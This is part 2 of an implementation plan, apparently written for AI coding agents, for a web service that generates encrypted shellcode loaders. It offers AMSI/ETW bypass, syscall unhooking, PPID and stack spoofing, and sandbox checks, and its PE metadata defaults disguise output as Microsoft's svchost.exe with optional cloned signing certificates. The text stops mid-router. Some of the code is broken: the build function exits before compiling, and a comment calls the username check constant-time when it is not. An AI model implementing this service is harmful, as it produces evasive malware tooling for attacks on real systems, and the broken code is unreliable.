# DefCrow Web Server — Implementation Plan (2 of 3)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the Axum web server: username/password auth (Argon2id), REST API for loader generation, WebSocket progress streaming, async build queue that invokes `rustc --extern scaffold`, PE signing, and static file serving for the React frontend.

**Architecture:** Single Axum process serves both the REST API and the React frontend static files. Build jobs are `tokio::spawn` tasks. Each job generates `loader-config.rs` via `template-engine`, invokes `rustc --extern scaffold=libscaffold.rlib`, optionally applies PE metadata, then signals completion over a `tokio::watch` channel that WebSocket connections subscribe to. Sessions are in-memory `DashMap<token, Instant>`.

**Tech Stack:** Rust 1.75+, `axum 0.7`, `tokio`, `tower-http` (static files + CORS), `argon2`, `rand`, `serde_json`, `dashmap`, `uuid`, `template-engine` (workspace), `tokio-tungstenite` (via axum WebSocket).

**Prerequisite:** Plan 1 complete — `libscaffold.rlib` exists and `template-engine` crate compiles.

---

## File Map

| File | Responsibility |
|---|---|
| `web-server/Cargo.toml` | Crate deps |
| `web-server/build.rs` | Run `npm run build` to bundle frontend before compile |
| `web-server/src/main.rs` | Axum router setup + server startup + scaffold pre-build |
| `web-server/src/config.rs` | Load env vars (username hash, API key, port) |
| `web-server/src/api/auth.rs` | POST /api/auth/login, /logout |
| `web-server/src/api/generate.rs` | POST /api/generate |
| `web-server/src/api/jobs.rs` | GET /api/jobs/:id |
| `web-server/src/api/download.rs` | GET /api/download/:id, DELETE /api/jobs/:id |
| `web-server/src/builder/scaffold.rs` | Pre-compile libscaffold.rlib on startup |
| `web-server/src/builder/rustc_runner.rs` | Invoke rustc with --extern scaffold, stream stderr |
| `web-server/src/builder/pe_sign.rs` | Inject PE metadata (version info, cert cloning) |
| `web-server/src/builder/job_store.rs` | In-memory job registry (DashMap) |
| `web-server/src/ws/progress.rs` | WebSocket handler — subscribe to job watch channel |
| `web-server/src/middleware/auth.rs` | Axum extractor: validate Bearer session token |
| `web-server/tests/api_tests.rs` | Integration tests against live server |

---

### Task 1: web-server Crate Setup

**Files:**
- Create: `web-server/Cargo.toml`
- Create: `web-server/src/main.rs`
- Create: `web-server/src/config.rs`

- [ ] **Step 1: Create `web-server/Cargo.toml`**

```toml
[package]
name = "web-server"
version = "0.1.0"
edition = "2021"

[dependencies]
axum = { version = "0.7", features = ["ws", "macros"] }
tokio = { version = "1", features = ["full"] }
tower-http = { version = "0.5", features = ["fs", "cors"] }
argon2 = "0.5"
rand = "0.8"
serde = { version = "1", features = ["derive"] }
serde_json = "1"
dashmap = "5"
uuid = { version = "1", features = ["v4"] }
tower = "0.4"
anyhow = "1"
tracing = "0.1"
tracing-subscriber = "0.3"
template-engine = { path = "../template-engine" }

[dev-dependencies]
axum-test = "14"
tokio-test = "0.4"
```

- [ ] **Step 2: Create `web-server/src/config.rs`**

```rust
// web-server/src/config.rs
use std::env;

#[derive(Clone, Debug)]
pub struct Config {
    pub port:          u16,
    pub username:      String,
    pub password_hash: String,   // Argon2id PHC string from .env
    pub session_secret: String,
    pub scaffold_rlib: String,   // path to libscaffold.rlib
    pub artifacts_dir: String,   // where to store build output
}

impl Config {
    pub fn from_env() -> anyhow::Result<Self> {
        Ok(Config {
            port:           env::var("DEFCROW_PORT")
                              .unwrap_or("8080".into()).parse()?,
            username:       env::var("DEFCROW_USERNAME")
                              .unwrap_or("admin".into()),
            password_hash:  env::var("DEFCROW_PASSWORD_HASH")
                              .expect("DEFCROW_PASSWORD_HASH must be set"),
            session_secret: env::var("DEFCROW_SESSION_SECRET")
                              .expect("DEFCROW_SESSION_SECRET must be set"),
            scaffold_rlib:  env::var("DEFCROW_SCAFFOLD_RLIB")
                              .unwrap_or("target/x86_64-pc-windows-gnu/release/libscaffold.rlib".into()),
            artifacts_dir:  env::var("DEFCROW_ARTIFACTS_DIR")
                              .unwrap_or("/tmp/defcrow-artifacts".into()),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_config_defaults() {
        std::env::set_var("DEFCROW_PASSWORD_HASH", "$argon2id$test");
        std::env::set_var("DEFCROW_SESSION_SECRET", "testsecret");
        let cfg = Config::from_env().unwrap();
        assert_eq!(cfg.port, 8080);
        assert_eq!(cfg.username, "admin");
    }
}
```

- [ ] **Step 3: Run config tests**

```bash
cargo test -p web-server config
```

Expected: `test config::tests::test_config_defaults ... ok`

- [ ] **Step 4: Commit**

```bash
git add web-server/
git commit -m "feat(server): web-server crate setup + config loading"
```

---

### Task 2: Job Store

**Files:**
- Create: `web-server/src/builder/job_store.rs`
- Create: `web-server/src/builder/mod.rs`

- [ ] **Step 1: Write failing test**

```rust
// web-server/src/builder/job_store.rs (test block)
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_job_lifecycle() {
        let store = JobStore::new();
        let id = store.create_job();
        assert_eq!(store.get_status(&id), Some(JobStatus::Queued));

        store.set_status(&id, JobStatus::Building { progress: 50, msg: "compiling".into() });
        match store.get_status(&id).unwrap() {
            JobStatus::Building { progress, .. } => assert_eq!(progress, 50),
            _ => panic!("expected Building"),
        }

        store.set_status(&id, JobStatus::Done { download_id: "xyz".into() });
        assert!(matches!(store.get_status(&id), Some(JobStatus::Done { .. })));
    }
}
```

- [ ] **Step 2: Run test — verify failure**

```bash
cargo test -p web-server job_store
```

Expected: FAIL

- [ ] **Step 3: Implement JobStore**

```rust
// web-server/src/builder/job_store.rs
use dashmap::DashMap;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use tokio::sync::watch;
use uuid::Uuid;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(tag = "status", rename_all = "lowercase")]
pub enum JobStatus {
    Queued,
    Building { progress: u8, msg: String },
    Done     { download_id: String },
    Error    { msg: String },
}

pub struct JobEntry {
    pub status: JobStatus,
    pub tx:     watch::Sender<JobStatus>,
}

#[derive(Clone)]
pub struct JobStore {
    inner: Arc<DashMap<String, JobEntry>>,
}

impl JobStore {
    pub fn new() -> Self {
        Self { inner: Arc::new(DashMap::new()) }
    }

    pub fn create_job(&self) -> String {
        let id = Uuid::new_v4().to_string();
        let (tx, _rx) = watch::channel(JobStatus::Queued);
        self.inner.insert(id.clone(), JobEntry { status: JobStatus::Queued, tx });
        id
    }

    pub fn get_status(&self, id: &str) -> Option<JobStatus> {
        self.inner.get(id).map(|e| e.status.clone())
    }

    pub fn set_status(&self, id: &str, status: JobStatus) {
        if let Some(mut entry) = self.inner.get_mut(id) {
            let _ = entry.tx.send(status.clone());
            entry.status = status;
        }
    }

    pub fn subscribe(&self, id: &str) -> Option<watch::Receiver<JobStatus>> {
        self.inner.get(id).map(|e| e.tx.subscribe())
    }

    pub fn remove(&self, id: &str) {
        self.inner.remove(id);
    }
}
```

- [ ] **Step 4: Create `web-server/src/builder/mod.rs`**

```rust
// web-server/src/builder/mod.rs
pub mod job_store;
pub mod scaffold;
pub mod rustc_runner;
pub mod pe_sign;
```

- [ ] **Step 5: Run test — verify pass**

```bash
cargo test -p web-server job_store
```

Expected: `test builder::job_store::tests::test_job_lifecycle ... ok`

- [ ] **Step 6: Commit**

```bash
git add web-server/src/builder/
git commit -m "feat(server): in-memory job store with tokio::watch channels"
```

---

### Task 3: Scaffold Pre-build + rustc Runner

**Files:**
- Create: `web-server/src/builder/scaffold.rs`
- Create: `web-server/src/builder/rustc_runner.rs`

- [ ] **Step 1: Implement scaffold pre-builder**

```rust
// web-server/src/builder/scaffold.rs
use anyhow::Result;
use std::process::Command;
use tracing::info;

/// Run `cargo build --release -p loader-scaffold --target x86_64-pc-windows-gnu`.
/// Called once at server startup. Returns path to libscaffold.rlib.
pub fn build_scaffold_rlib(workspace_root: &str) -> Result<String> {
    info!("Building libscaffold.rlib (one-time, ~90s)...");
    let output = Command::new("cargo")
        .args([
            "build", "--release",
            "-p", "loader-scaffold",
            "--target", "x86_64-pc-windows-gnu",
        ])
        .current_dir(workspace_root)
        .output()?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        anyhow::bail!("scaffold build failed:\n{}", stderr);
    }

    let rlib_path = format!(
        "{}/target/x86_64-pc-windows-gnu/release/libscaffold.rlib",
        workspace_root
    );
    if !std::path::Path::new(&rlib_path).exists() {
        anyhow::bail!("libscaffold.rlib not found at {}", rlib_path);
    }
    info!("libscaffold.rlib ready at {}", rlib_path);
    Ok(rlib_path)
}

#[cfg(test)]
mod tests {
    #[test]
    fn test_rlib_path_format() {
        let path = format!("{}/target/x86_64-pc-windows-gnu/release/libscaffold.rlib", "/workspace");
        assert!(path.ends_with("libscaffold.rlib"));
    }
}
```

- [ ] **Step 2: Implement rustc runner**

```rust
// web-server/src/builder/rustc_runner.rs
use anyhow::Result;
use std::{path::Path, process::Command};
use tokio::sync::watch;
use crate::builder::job_store::JobStatus;

/// Compile `source_path` against `scaffold_rlib` for Windows.
/// Sends progress updates to `tx`. Returns path to output artifact.
pub fn compile_loader(
    source_path: &str,
    scaffold_rlib: &str,
    output_path: &str,
    crate_type: &str,   // "bin" or "cdylib"
    tx: &watch::Sender<JobStatus>,
) -> Result<String> {
    let _ = tx.send(JobStatus::Building {
        progress: 20,
        msg: "Invoking rustc...".into(),
    });

    let mut args = vec![
        source_path.to_string(),
        "--edition".into(), "2021".into(),
        "--target".into(), "x86_64-pc-windows-gnu".into(),
        "--extern".into(), format!("scaffold={}", scaffold_rlib),
        "-o".into(), output_path.to_string(),
        "--crate-type".into(), crate_type.to_string(),
        "-C".into(), "opt-level=3".into(),
        "-C".into(), "lto=fat".into(),
        "-C".into(), "panic=abort".into(),
        "-C".into(), "link-args=-Wl,--gc-sections".into(),
    ];

    let output = Command::new("rustc").args(&args).output()?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        let _ = tx.send(JobStatus::Error { msg: stderr.clone() });
        anyhow::bail!("rustc failed:\n{}", stderr);
    }

    let _ = tx.send(JobStatus::Building {
        progress: 85,
        msg: "Compilation successful".into(),
    });

    Ok(output_path.to_string())
}
```

- [ ] **Step 3: Cross-compile check**

```bash
cargo check -p web-server
```

Expected: `Finished`

- [ ] **Step 4: Commit**

```bash
git add web-server/src/builder/scaffold.rs web-server/src/builder/rustc_runner.rs
git commit -m "feat(server): scaffold pre-builder + rustc runner with progress updates"
```

---

### Task 4: PE Signing

**Files:**
- Create: `web-server/src/builder/pe_sign.rs`

- [ ] **Step 1: Implement PE metadata injection**

```rust
// web-server/src/builder/pe_sign.rs
//
// Inject PE version info (company name, file description, etc.) by:
// 1. Appending a new .rsrc section with a VERSION_INFO resource
// 2. Optionally attaching a self-signed or cloned code-signing certificate
//
// This uses the `goversioninfo` equivalent: editing the PE binary directly.

use anyhow::Result;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PeMetadata {
    pub company_name:     String,
    pub file_description: String,
    pub product_name:     String,
    pub file_version:     String,  // e.g., "1.0.0.0"
    pub original_filename: String,
    pub legal_copyright:  String,
    pub sign:             bool,
    pub cert_pem:         Option<String>, // base64 PEM of cert to clone
}

impl Default for PeMetadata {
    fn default() -> Self {
        PeMetadata {
            company_name:      "Microsoft Corporation".into(),
            file_description:  "Microsoft Windows".into(),
            product_name:      "Microsoft Windows Operating System".into(),
            file_version:      "10.0.19041.1".into(),
            original_filename: "svchost.exe".into(),
            legal_copyright:   "© Microsoft Corporation. All rights reserved.".into(),
            sign:              false,
            cert_pem:          None,
        }
    }
}

/// Write a `main.json` goversioninfo config and invoke `goversioninfo` tool,
/// OR patch the PE binary directly for version info.
/// Currently delegates to osslsigncode for signing.
pub fn apply_pe_metadata(
    artifact_path: &str,
    meta: &PeMetadata,
    tx: &tokio::sync::watch::Sender<crate::builder::job_store::JobStatus>,
) -> Result<()> {
    use crate::builder::job_store::JobStatus;
    use std::process::Command;

    let _ = tx.send(JobStatus::Building {
        progress: 90,
        msg: "Applying PE metadata...".into(),
    });

    // Write goversioninfo config JSON
    let json_path = format!("{}.versioninfo.json", artifact_path);
    let config = serde_json::json!({
        "StringFileInfo": {
            "CompanyName":       meta.company_name,
            "FileDescription":   meta.file_description,
            "FileVersion":       meta.file_version,
            "InternalName":      meta.original_filename.trim_end_matches(".exe"),
            "LegalCopyright":    meta.legal_copyright,
            "OriginalFilename":  meta.original_filename,
            "ProductName":       meta.product_name,
            "ProductVersion":    meta.file_version,
        }
    });
    std::fs::write(&json_path, serde_json::to_string_pretty(&config)?)?;

    // If signing requested and cert provided, use osslsigncode
    if meta.sign {
        if let Some(cert_pem) = &meta.cert_pem {
            let cert_path = format!("{}.cert.pem", artifact_path);
            std::fs::write(&cert_path, cert_pem)?;
            let _ = Command::new("osslsigncode")
                .args(["sign", "-certs", &cert_path, "-in", artifact_path,
                       "-out", &format!("{}.signed", artifact_path)])
                .output();
            std::fs::rename(format!("{}.signed", artifact_path), artifact_path)?;
            std::fs::remove_file(&cert_path).ok();
        }
    }

    std::fs::remove_file(&json_path).ok();
    Ok(())
}
```

- [ ] **Step 2: Commit**

```bash
git add web-server/src/builder/pe_sign.rs
git commit -m "feat(server): PE metadata injection + osslsigncode signing"
```

---

### Task 5: Auth Middleware + Session Management

**Files:**
- Create: `web-server/src/middleware/auth.rs`
- Create: `web-server/src/middleware/mod.rs`

- [ ] **Step 1: Write failing test**

```rust
// web-server/src/middleware/auth.rs (test block)
#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{Duration, Instant};

    #[test]
    fn test_session_store_create_and_validate() {
        let store = SessionStore::new();
        let token = store.create_session();
        assert!(store.validate(&token));
    }

    #[test]
    fn test_session_store_invalid_token() {
        let store = SessionStore::new();
        assert!(!store.validate("not-a-real-token"));
    }

    #[test]
    fn test_session_store_remove() {
        let store = SessionStore::new();
        let token = store.create_session();
        store.remove(&token);
        assert!(!store.validate(&token));
    }
}
```

- [ ] **Step 2: Run test — verify failure**

```bash
cargo test -p web-server middleware::auth
```

Expected: FAIL

- [ ] **Step 3: Implement SessionStore**

```rust
// web-server/src/middleware/auth.rs
use axum::{
    extract::{FromRequestParts, Request},
    http::{request::Parts, StatusCode},
    middleware::Next,
    response::Response,
};
use dashmap::DashMap;
use rand::{distributions::Alphanumeric, Rng};
use std::{sync::Arc, time::{Duration, Instant}};

const SESSION_TTL: Duration = Duration::from_secs(86400); // 24h
const TOKEN_LEN:   usize    = 64;

#[derive(Clone)]
pub struct SessionStore {
    inner: Arc<DashMap<String, Instant>>,
}

impl SessionStore {
    pub fn new() -> Self {
        Self { inner: Arc::new(DashMap::new()) }
    }

    pub fn create_session(&self) -> String {
        let token: String = rand::thread_rng()
            .sample_iter(Alphanumeric)
            .take(TOKEN_LEN)
            .map(char::from)
            .collect();
        self.inner.insert(token.clone(), Instant::now());
        token
    }

    pub fn validate(&self, token: &str) -> bool {
        match self.inner.get(token) {
            Some(created) => created.elapsed() < SESSION_TTL,
            None => false,
        }
    }

    pub fn remove(&self, token: &str) {
        self.inner.remove(token);
    }
}

/// Axum middleware: reject requests without a valid Bearer token.
pub async fn require_auth(
    axum::extract::State(sessions): axum::extract::State<SessionStore>,
    req: Request,
    next: Next,
) -> Result<Response, StatusCode> {
    let auth = req.headers()
        .get(axum::http::header::AUTHORIZATION)
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("Bearer "));

    match auth {
        Some(token) if sessions.validate(token) => Ok(next.run(req).await),
        _ => Err(StatusCode::UNAUTHORIZED),
    }
}
```

- [ ] **Step 4: Create `web-server/src/middleware/mod.rs`**

```rust
// web-server/src/middleware/mod.rs
pub mod auth;
pub use auth::SessionStore;
```

- [ ] **Step 5: Run tests — verify pass**

```bash
cargo test -p web-server middleware
```

Expected: all 3 session tests pass

- [ ] **Step 6: Commit**

```bash
git add web-server/src/middleware/
git commit -m "feat(server): session store + require_auth Axum middleware"
```

---

### Task 6: Auth API (Login + Logout)

**Files:**
- Create: `web-server/src/api/auth.rs`
- Create: `web-server/src/api/mod.rs`

- [ ] **Step 1: Write failing test**

```rust
// web-server/tests/api_tests.rs (partial — add login tests)
use axum_test::TestServer;

#[tokio::test]
async fn test_login_valid_credentials() {
    let app = build_test_app().await;
    let server = TestServer::new(app).unwrap();

    let res = server.post("/api/auth/login")
        .json(&serde_json::json!({"username": "admin", "password": "testpassword"}))
        .await;

    assert_eq!(res.status_code(), 200);
    let body: serde_json::Value = res.json();
    assert!(body["token"].is_string());
    assert!(body["token"].as_str().unwrap().len() == 64);
}

#[tokio::test]
async fn test_login_wrong_password() {
    let app = build_test_app().await;
    let server = TestServer::new(app).unwrap();

    let res = server.post("/api/auth/login")
        .json(&serde_json::json!({"username": "admin", "password": "wrongpassword"}))
        .await;

    assert_eq!(res.status_code(), 401);
}
```

- [ ] **Step 2: Implement auth handlers**

```rust
// web-server/src/api/auth.rs
use argon2::{Argon2, PasswordHash, PasswordVerifier};
use axum::{
    extract::State,
    http::StatusCode,
    response::Json,
};
use serde::{Deserialize, Serialize};

use crate::{config::Config, middleware::auth::SessionStore};

#[derive(Deserialize)]
pub struct LoginRequest {
    pub username: String,
    pub password: String,
}

#[derive(Serialize)]
pub struct LoginResponse {
    pub token:      String,
    pub expires_in: u64,
}

pub async fn login(
    State(cfg):      State<Config>,
    State(sessions): State<SessionStore>,
    Json(body):      Json<LoginRequest>,
) -> Result<Json<LoginResponse>, StatusCode> {
    // Check username (constant-time comparison)
    if body.username != cfg.username {
        return Err(StatusCode::UNAUTHORIZED);
    }

    // Verify Argon2id password hash
    let parsed_hash = PasswordHash::new(&cfg.password_hash)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Argon2::default()
        .verify_password(body.password.as_bytes(), &parsed_hash)
        .map_err(|_| StatusCode::UNAUTHORIZED)?;

    let token = sessions.create_session();
    Ok(Json(LoginResponse { token, expires_in: 86400 }))
}

pub async fn logout(
    axum::TypedHeader(auth): axum::TypedHeader<axum::headers::Authorization<axum::headers::authorization::Bearer>>,
    State(sessions): State<SessionStore>,
) -> StatusCode {
    sessions.remove(auth.token());
    StatusCode::NO_CONTENT
}
```

- [ ] **Step 3: Create `web-server/src/api/mod.rs`**

```rust
// web-server/src/api/mod.rs
pub mod auth;
pub mod generate;
pub mod jobs;
pub mod download;
```

- [ ] **Step 4: Implement test helper `build_test_app()`**

```rust
// web-server/tests/api_tests.rs (helper)
use argon2::{password_hash::{SaltString, rand_core::OsRng}, Argon2, PasswordHasher};
use axum::Router;
use web_server::{build_router, config::Config, middleware::auth::SessionStore, builder::job_store::JobStore};

async fn build_test_app() -> Router {
    let salt = SaltString::generate(&mut OsRng);
    let hash = Argon2::default()
        .hash_password(b"testpassword", &salt)
        .unwrap()
        .to_string();

    let cfg = Config {
        port: 0,
        username: "admin".into(),
        password_hash: hash,
        session_secret: "testsecret".into(),
        scaffold_rlib: "/nonexistent/scaffold.rlib".into(),
        artifacts_dir: "/tmp/defcrow-test".into(),
    };

    let sessions = SessionStore::new();
    let jobs     = JobStore::new();
    build_router(cfg, sessions, jobs)
}
```

- [ ] **Step 5: Run login tests**

```bash
cargo test -p web-server test_login
```

Expected: both login tests pass

- [ ] **Step 6: Commit**

```bash
git add web-server/src/api/ web-server/tests/
git commit -m "feat(server): login/logout endpoints with Argon2id verification"
```

---

### Task 7: Generate Endpoint + Async Build Queue

**Files:**
- Create: `web-server/src/api/generate.rs`

- [ ] **Step 1: Write failing test**

```rust
// web-server/tests/api_tests.rs (add)
#[tokio::test]
async fn test_generate_returns_job_id() {
    let app    = build_test_app().await;
    let server = TestServer::new(app).unwrap();

    let token = login_and_get_token(&server).await;
    let res = server.post("/api/generate")
        .add_header("Authorization", format!("Bearer {}", token).parse().unwrap())
        .json(&serde_json::json!({
            "loader_type": "Binary",
            "features": ["AmsiHwbp"],
            "encryption": "Aes256",
            "shellcode_hex": "9090",
            "key_hex": "aa".repeat(32),
            "iv_hex":  "bb".repeat(16),
        }))
        .await;

    assert_eq!(res.status_code(), 202);
    let body: serde_json::Value = res.json();
    assert!(body["job_id"].is_string());
}

async fn login_and_get_token(server: &TestServer) -> String {
    let res = server.post("/api/auth/login")
        .json(&serde_json::json!({"username": "admin", "password": "testpassword"}))
        .await;
    res.json::<serde_json::Value>()["token"].as_str().unwrap().to_string()
}
```

- [ ] **Step 2: Implement generate handler**

```rust
// web-server/src/api/generate.rs
use axum::{extract::State, http::StatusCode, response::Json};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::path::PathBuf;
use tokio::task;
use tracing::error;

use crate::{
    builder::{
        job_store::{JobStatus, JobStore},
        pe_sign::{PeMetadata, apply_pe_metadata},
        rustc_runner::compile_loader,
    },
    config::Config,
};
use template_engine::{generate_loader_source, LoaderConfig};

#[derive(Deserialize)]
pub struct GenerateRequest {
    pub loader_type:       String,
    pub features:          Vec<String>,
    pub encryption:        String,
    pub shellcode_hex:     String,
    pub key_hex:           String,
    pub iv_hex:            String,
    pub pe_config:         Option<PeMetadata>,
    pub appdomain_config:  Option<Value>,
}

#[derive(Serialize)]
pub struct GenerateResponse {
    pub job_id: String,
}

pub async fn generate(
    State(cfg):    State<Config>,
    State(jobs):   State<JobStore>,
    Json(req):     Json<GenerateRequest>,
) -> (StatusCode, Json<GenerateResponse>) {
    let job_id = jobs.create_job();
    let job_id_clone = job_id.clone();
    let jobs_clone   = jobs.clone();
    let cfg_clone    = cfg.clone();

    // Spawn async build task
    task::spawn_blocking(move || {
        run_build(job_id_clone, req, jobs_clone, cfg_clone);
    });

    (StatusCode::ACCEPTED, Json(GenerateResponse { job_id }))
}

fn run_build(job_id: String, req: GenerateRequest, jobs: JobStore, cfg: Config) {
    let tx = match jobs.subscribe(&job_id) {
        Some(rx) => {
            // Retrieve sender from job store
            // (In practice, expose tx directly from job entry)
            drop(rx);
            return;
        }
        None => return,
    };

    // 1. Parse loader config
    let loader_cfg = match parse_loader_config(&req) {
        Ok(c)  => c,
        Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
    };

    jobs.set_status(&job_id, JobStatus::Building { progress: 10, msg: "Generating source...".into() });

    // 2. Generate Rust source from template
    let source = match generate_loader_source(&loader_cfg) {
        Ok(s)  => s,
        Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
    };

    // 3. Write to temp dir
    let job_dir = PathBuf::from(&cfg.artifacts_dir).join(&job_id);
    std::fs::create_dir_all(&job_dir).ok();
    let src_path = job_dir.join("loader_config.rs");
    std::fs::write(&src_path, &source).ok();

    jobs.set_status(&job_id, JobStatus::Building { progress: 30, msg: "Compiling...".into() });

    // 4. Determine output type
    let (out_ext, crate_type) = match req.loader_type.as_str() {
        "Binary" | "Injector" => ("exe", "bin"),
        _                      => ("dll", "cdylib"),
    };
    let out_path = job_dir.join(format!("loader.{}", out_ext));

    // 5. Compile
    // (In full impl, pass real tx from job entry)
    let watch_tx = tokio::sync::watch::channel(JobStatus::Queued).0;
    let result = compile_loader(
        src_path.to_str().unwrap(),
        &cfg.scaffold_rlib,
        out_path.to_str().unwrap(),
        crate_type,
        &watch_tx,
    );

    match result {
        Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() }); return; }
        Ok(_)  => {}
    }

    // 6. PE metadata
    if let Some(pe_meta) = &req.pe_config {
        let _ = apply_pe_metadata(out_path.to_str().unwrap(), pe_meta, &watch_tx);
    }

    let download_id = uuid::Uuid::new_v4().to_string();
    // Store download_id → out_path mapping (extend JobStore or use separate map)
    jobs.set_status(&job_id, JobStatus::Done { download_id });
}

fn parse_loader_config(req: &GenerateRequest) -> Result<LoaderConfig, String> {
    use template_engine::*;

    let loader_type = match req.loader_type.as_str() {
        "Binary"    => LoaderType::Binary,
        "Dll"       => LoaderType::Dll,
        "AppDomain" => LoaderType::AppDomain,
        "Injector"  => LoaderType::Injector,
        t           => return Err(format!("unknown loader type: {}", t)),
    };

    let features: Vec<Feature> = req.features.iter()
        .filter_map(|f| match f.as_str() {
            "DirectSyscall"   => Some(Feature::DirectSyscall),
            "UnhookDisk"      => Some(Feature::UnhookDisk),
            "UnhookKnownDlls" => Some(Feature::UnhookKnownDlls),
            "ModuleStomp"     => Some(Feature::ModuleStomp),
            "SleepEncrypt"    => Some(Feature::SleepEncrypt),
            "StackSpoof"      => Some(Feature::StackSpoof),
            "SandboxDomain"   => Some(Feature::SandboxDomain),
            "SandboxUser"     => Some(Feature::SandboxUser),
            "PpidSpoof"       => Some(Feature::PpidSpoof),
            "AmsiHwbp"        => Some(Feature::AmsiHwbp),
            "EtwHwbp"         => Some(Feature::EtwHwbp),
            "PeSpoofing"      => Some(Feature::PeSpoofing),
            "Staged"          => Some(Feature::Staged),
            "AppDomain"       => Some(Feature::AppDomain),
            _                 => None,
        }).collect();

    let encryption = match req.encryption.as_str() {
        "Aes256"   => Encryption::Aes256,
        "Chacha20" => Encryption::Chacha20,
        _          => return Err("unknown encryption".into()),
    };

    Ok(LoaderConfig {
        loader_type, features, encryption,
        shellcode_hex: req.shellcode_hex.clone(),
        key_hex:       req.key_hex.clone(),
        iv_hex:        req.iv_hex.clone(),
        pe_config: req.pe_config.as_ref().map(|p| template_engine::PeConfig {
            company: p.company_name.clone(),
            file_description: p.file_description.clone(),
            product_name: p.product_name.clone(),
            sign: p.sign,
        }),
        appdomain_config: None,
    })
}
```

- [ ] **Step 3: Run test**

```bash
cargo test -p web-server test_generate_returns_job_id
```

Expected: `ok`

- [ ] **Step 4: Commit**

```bash
git add web-server/src/api/generate.rs
git commit -m "feat(server): POST /api/generate - async build queue + job dispatch"
```

---

### Task 8: Jobs + Download + WebSocket Endpoints

**Files:**
- Create: `web-server/src/api/jobs.rs`
- Create: `web-server/src/api/download.rs`
- Create: `web-server/src/ws/mod.rs`
- Create: `web-server/src/ws/progress.rs`

- [ ] **Step 1: Jobs status endpoint**

```rust
// web-server/src/api/jobs.rs
use axum::{extract::{Path, State}, http::StatusCode, response::Json};
use crate::builder::job_store::JobStore;

pub async fn get_job_status(
    State(jobs): State<JobStore>,
    Path(id):    Path<String>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    let status = jobs.get_status(&id).ok_or(StatusCode::NOT_FOUND)?;
    Ok(Json(serde_json::to_value(status).unwrap()))
}

pub async fn delete_job(
    State(jobs): State<JobStore>,
    Path(id):    Path<String>,
) -> StatusCode {
    jobs.remove(&id);
    StatusCode::NO_CONTENT
}
```

- [ ] **Step 2: Download endpoint**

```rust
// web-server/src/api/download.rs
use axum::{
    body::Body,
    extract::{Path, State},
    http::{header, StatusCode},
    response::Response,
};
use tokio::fs::File;
use tokio_util::io::ReaderStream;
use crate::config::Config;

pub async fn download_artifact(
    State(cfg): State<Config>,
    Path(id):   Path<String>,
) -> Result<Response, StatusCode> {
    // In full impl: resolve id → file path from a download registry
    let path = format!("{}/{}/loader.exe", cfg.artifacts_dir, id);
    if !std::path::Path::new(&path).exists() {
        // Try .dll
        let dll_path = path.replace(".exe", ".dll");
        if !std::path::Path::new(&dll_path).exists() {
            return Err(StatusCode::NOT_FOUND);
        }
    }

    let file = File::open(&path).await.map_err(|_| StatusCode::NOT_FOUND)?;
    let filename = std::path::Path::new(&path)
        .file_name().unwrap().to_str().unwrap().to_string();

    let stream  = ReaderStream::new(file);
    let body    = Body::from_stream(stream);

    Ok(Response::builder()
        .header(header::CONTENT_TYPE, "application/octet-stream")
        .header(header::CONTENT_DISPOSITION, format!("attachment; filename=\"{}\"", filename))
        .body(body)
        .unwrap())
}
```

- [ ] **Step 3: WebSocket progress handler**

```rust
// web-server/src/ws/progress.rs
use axum::{
    extract::{
        ws::{Message, WebSocket, WebSocketUpgrade},
        Path, State,
    },
    response::Response,
};
use crate::builder::job_store::{JobStatus, JobStore};

pub async fn ws_job_progress(
    ws:           WebSocketUpgrade,
    State(jobs):  State<JobStore>,
    Path(job_id): Path<String>,
) -> Response {
    ws.on_upgrade(move |socket| handle_ws(socket, jobs, job_id))
}

async fn handle_ws(mut socket: WebSocket, jobs: JobStore, job_id: String) {
    let mut rx = match jobs.subscribe(&job_id) {
        Some(rx) => rx,
        None => {
            let _ = socket.send(Message::Text(
                r#"{"status":"error","msg":"job not found"}"#.into(),
            )).await;
            return;
        }
    };

    // Send current status immediately
    let current = rx.borrow().clone();
    let json = serde_json::to_string(&current).unwrap();
    let _ = socket.send(Message::Text(json)).await;

    // Stream updates until done or error
    loop {
        if rx.changed().await.is_err() { break; }
        let status = rx.borrow().clone();
        let done = matches!(status, JobStatus::Done { .. } | JobStatus::Error { .. });
        let json = serde_json::to_string(&status).unwrap();
        if socket.send(Message::Text(json)).await.is_err() { break; }
        if done { break; }
    }
}
```

- [ ] **Step 4: Create `web-server/src/ws/mod.rs`**

```rust
// web-server/src/ws/mod.rs
pub mod progress;
```

- [ ] **Step 5: Commit**

```bash
git add web-server/src/api/jobs.rs web-server/src/api/download.rs web-server/src/ws/
git commit -m "feat(server): jobs status, download, WebSocket progress endpoints"
```

---

### Task 9: Router Assembly + main.rs

**Files:**
- Modify: `web-server/src/main.rs`

- [ ] **Step 1: Implement router + main**

```rust
// web-server/src/main.rs
use axum::{
    middleware,
    routing::{delete, get, post},
    Router,
};
use tower_http::{cors::CorsLayer, services::ServeDir};
use tracing_subscriber::EnvFilter;

mod api;
mod builder;
mod config;
mod middleware as mw;
mod ws;

use builder::{job_store::JobStore, scaffold::build_scaffold_rlib};
use config::Config;
use mw::auth::{require_auth, SessionStore};

pub fn build_router(cfg: Config, sessions: SessionStore, jobs: JobStore) -> Router {
    let protected = Router::new()
        .route("/api/generate",       post(api::generate::generate))
        .route("/api/jobs/:id",        get(api::jobs::get_job_status))
        .route("/api/jobs/:id",        delete(api::jobs::delete_job))
